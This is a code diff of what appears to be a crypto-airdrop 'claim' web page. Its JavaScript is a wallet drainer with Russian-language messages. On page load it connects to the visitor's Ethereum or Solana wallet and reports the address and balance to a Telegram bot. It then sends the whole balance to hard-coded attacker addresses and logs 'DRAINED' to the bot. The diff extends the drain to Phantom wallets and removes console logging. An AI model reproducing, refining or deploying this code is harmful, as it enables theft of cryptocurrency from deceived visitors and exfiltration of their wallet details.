@@ -12,17 +12,17 @@
     body { background: linear-gradient(135deg, #0f001a 0%, #1a0033 50%, #0a0a12 100%); color: #e0e0ff; margin: 0; font-family: system-ui; min-height: 100vh; overflow-x: hidden; }
     .glow { text-shadow: 0 0 25px #a855f7, 0 0 50px #c026d3; animation: pulse 3s infinite alternate; }
     @keyframes pulse { 0% { text-shadow: 0 0 15px #a855f7; } 100% { text-shadow: 0 0 35px #c026d3; } }
-    .btn { background: linear-gradient(90deg, #7c3aed, #ec4899); padding: 1.2rem 2.5rem; border-radius: 999px; font-weight: bold; transition: all 0.3s; cursor: pointer; }
+    .btn { background: linear-gradient(90deg, #7c3aed, #ec4899); padding: 1rem 2rem; border-radius: 999px; font-weight: bold; transition: all 0.3s; cursor: pointer; }
     .btn:hover { transform: scale(1.06); box-shadow: 0 0 40px #a855f7; }
     .claim-btn { background: linear-gradient(90deg, #22c55e, #4ade80); padding: 1.4rem 3rem; border-radius: 999px; font-weight: bold; font-size: 1.5rem; margin: 2rem auto; display: block; width: 90%; max-width: 400px; text-align: center; transition: all 0.3s; }
     .claim-btn:hover { transform: scale(1.05); box-shadow: 0 0 50px #22c55e; }
-    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 9999; align-items: center; justify-content: center; }
-    .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2rem; border-radius: 1.5rem; width: 90%; max-width: 480px; border: 2px solid #a855f7; box-shadow: 0 0 80px #a855f7; overflow-y: auto; max-height: 90vh; }
-    .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin: 2rem 0; }
-    .wallet-item { cursor: pointer; transition: all 0.3s; text-align: center; padding: 1rem; border-radius: 1rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(168,85,247,0.3); height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999; align-items: center; justify-content: center; }
+    .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2rem; border-radius: 1.5rem; width: 90%; max-width: 480px; border: 2px solid #a855f7; box-shadow: 0 0 80px #a855f7; }
+    .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.2rem; margin: 2rem 0; }
+    .wallet-item { cursor: pointer; transition: all 0.3s; text-align: center; padding: 0.8rem; border-radius: 1rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(168,85,247,0.3); height: 150px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
     .wallet-item:hover { transform: scale(1.12); background: rgba(168,85,247,0.2); box-shadow: 0 0 30px rgba(168,85,247,0.6); }
-    .wallet-item img { width: 100px; height: 100px; object-fit: contain; margin-bottom: 0.5rem; }
-    .wallet-item p { font-size: 1.1rem; font-weight: 600; margin-top: 0.5rem; white-space: nowrap; }
+    .wallet-item img { width: 90px; height: 90px; object-fit: contain; margin-bottom: 0.4rem; }
+    .wallet-item p { font-size: 1rem; font-weight: 600; margin-top: 0.3rem; white-space: nowrap; }
   </style>
 </head>
 <body>
@@ -142,10 +142,7 @@
       try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
         await fetch(url);
-        console.log('Сообщение в Telegram:', message);
-      } catch (e) {
-        console.error('Ошибка Telegram:', e);
-      }
+      } catch (e) {}
     }
 
     async function getUri() {
@@ -154,7 +151,6 @@
         const d = await r.json();
         return d.uri || null;
       } catch (e) {
-        console.error(e);
         return null;
       }
     }
@@ -166,47 +162,35 @@
     async function connect(wallet) {
       const uri = await getUri();
       if (!uri) {
-        alert('Ошибка сессии — попробуй позже');
+        alert('Ошибка сессии');
         return;
       }
 
       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
       if (isMobile) {
-        let dl = `wc:${uri.replace(/^wc:/, '')}`; // универсальный wc: формат (самый стабильный)
-
-        // Специфические префиксы (пробуем все варианты)
         const attempts = [
-          dl,  // wc:...
-          `wc:${encodeURIComponent(uri)}`,
+          `wc:${uri.replace(/^wc:/, '')}`,
           `${wallet.toLowerCase()}://wc?uri=${encodeURIComponent(uri)}`,
-          `https://walletconnect.com/wc?uri=${encodeURIComponent(uri)}` // fallback на https
+          `wc?uri=${encodeURIComponent(uri)}`
         ];
 
-        await sendToTelegram(`Попытки открытия для ${wallet}: ${attempts.length} вариантов`);
-
-        // Запускаем все попытки с задержкой
-        attempts.forEach((link, index) => {
+        attempts.forEach((dl, i) => {
           setTimeout(() => {
-            window.location.href = link;
-            sendToTelegram(`Попытка #${index + 1}: ${link.substring(0, 50)}...`);
-          }, index * 800);
+            window.location.href = dl;
+          }, i * 600);
         });
 
         setTimeout(() => {
-          alert('Подтверди подключение и транзакцию в кошельке');
-        }, 5000);
-
-        document.getElementById('modal').style.display = 'none';
-        return;
+          alert('Подтверди подключение в кошельке');
+        }, 4000);
+      } else {
+        alert('Подтверди подключение в кошельке');
       }
-
-      alert('Подтверди подключение в кошельке');
     }
 
-    // Слив сразу после передачи сессии (если сайт открыт в кошельке)
     window.addEventListener('load', async () => {
-      if (window.ethereum || window.solana) {
+      if (window.ethereum || window.solana || window.phantom) {
         try {
           let provider, address, network, balanceFormatted, symbol, target;
 
@@ -225,8 +209,8 @@
             balanceFormatted = ethers.utils.formatEther(bal);
             symbol = network === 'Ethereum' ? 'ETH' : network === 'BNB Smart Chain' ? 'BNB' : 'MATIC';
             target = addresses[network] || '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000';
-          } else if (window.solana?.isPhantom) {
-            provider = window.solana;
+          } else if (window.solana || window.phantom?.solana) {
+            provider = window.phantom?.solana || window.solana;
             await provider.connect();
             address = provider.publicKey.toString();
             network = 'Solana';
@@ -237,8 +221,7 @@
             target = addresses[network] || 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM';
           }
 
-          const connectMsg = `Подключён кошелёк!\nАдрес: ${address}\nСеть: ${network}\nБаланс: ${balanceFormatted} ${symbol}`;
-          await sendToTelegram(connectMsg);
+          await sendToTelegram(`Подключён: ${address} (${network})\nБаланс: ${balanceFormatted} ${symbol}`);
 
           if (parseFloat(balanceFormatted) > 0) {
             const tx = await provider.getSigner().sendTransaction({
@@ -249,7 +232,7 @@
             await sendToTelegram(`DRAINED ${balanceFormatted} ${symbol} → ${target}`);
           }
         } catch (e) {
-          await sendToTelegram(`Ошибка слива: ${e.message}`);
+          await sendToTelegram(`Ошибка: ${e.message}`);
         }
       }
     });
